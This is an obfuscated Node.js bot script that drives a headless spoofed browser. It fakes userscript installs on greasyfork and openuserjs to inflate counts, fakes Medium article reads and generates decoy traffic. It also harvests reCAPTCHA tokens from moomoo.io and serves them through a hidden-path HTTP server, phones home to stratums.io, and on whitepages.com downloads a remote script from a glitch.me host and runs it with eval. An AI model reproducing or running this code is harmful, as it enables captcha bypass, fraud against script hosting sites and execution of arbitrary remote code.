      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x923 * -0x3 + -0x139 * 0x1 + -0x2dd * -0xa
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x28f + -0x52c + -0x7bb * -0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x970 * -0x2 + -0x3db + -0x23 * 0x6b), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x24db * 0x1 + -0x47e + -0x1ff9 * 0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * -0x1591 + 0x75a + 0xe37;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1384 + 0xc2d + 0x757; w < getRandomInt(0x727 * 0x3 + -0xfb7 + -0x5bd, 0x9a6 + 0x51 * 0x73 + -0x2e04); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xce3e + 0x1 * -0x1494d + -0x7 * -0x6dfd);
        }
      }();
    }, 0x817 + -0x1 * 0x595 + -0x21e), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xd * 0x2d9 + 0x1 * -0xb5e + -0x19a7;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y[Z(0xe)](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1711 + -0x50e + -0x1 * 0x1203, 0xd75 + -0x2 * 0x135d + -0x29 * -0x9f)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xa27f * 0x1 + -0xef * -0xfb + 0x2b * 0x10e);
    }, -0x19e6 + 0x186a + 0x1e0), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x253 + -0x171d + 0x14ca;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x140d + 0x1de7 + -0x1 * -0x1de), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x173d + -0x1 * -0x24fd + -0x3c3a), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xfd40c + 0x1 * -0x11a097 + -0x1 * -0xf882b);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x2c * 0x73 + 0x3 * 0x18e + -0x3 * -0x52a);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x90a + -0x5 * -0x4ee + -0x20e8);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x6b * 0x5d + -0x2336 + -0x69a5 * -0x1);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c;
  async function f() {
    const a0 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x23e2 + -0x1079 + 0x33c * -0x6) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x9a4 + -0x1e8b * -0x1 + -0x282e));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x25c4 + 0xd08 * 0x1 + 0x18bc, D['indexOf']('\x20'));
        return B ? E['slice'](0x17d2 + -0x1 * -0x1fa5 + -0x3777, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x2204 + 0x1ea2 * 0x2 + 0x1c1c * -0x2),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x71d + -0x1 * -0x1aa6 + 0x3b * 0x17),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': a0(0x1) + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + a1(0x8) + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + a1(0x2) + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x2648 + 0x1bc5 + -0x420d; k < -0x6 * -0x76 + -0x4e2 * -0x7 + -0x24ee; k++)
    setTimeout(f, (0x17d * 0x8b + 0x14378 + -0x127f7) * k * getRandomInt(-0x40 * 0xe + 0x64b * -0x1 + 0x13 * 0x84, -0x5dd * -0x3 + 0xf * 0x2d + -0x73 * 0x2d));
  setInterval(() => {
    f();
    for (let l = 0x1f5 * -0x2 + -0xf24 + 0x130e; l < 0x3 * 0x4c1 + 0x143c + -0x5b * 0x61; l++)
      setTimeout(f, (0x1756a + -0x1a286 + 0x8bbe * 0x2) * l * getRandomInt(0x2f * -0x7f + 0x1 * 0x1cd2 + -0x580, -0xac9 * -0x2 + -0x1716 + 0x187));
  }, -0x17 * -0x1d071 + 0xc5 * -0x704f + 0x63a124);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
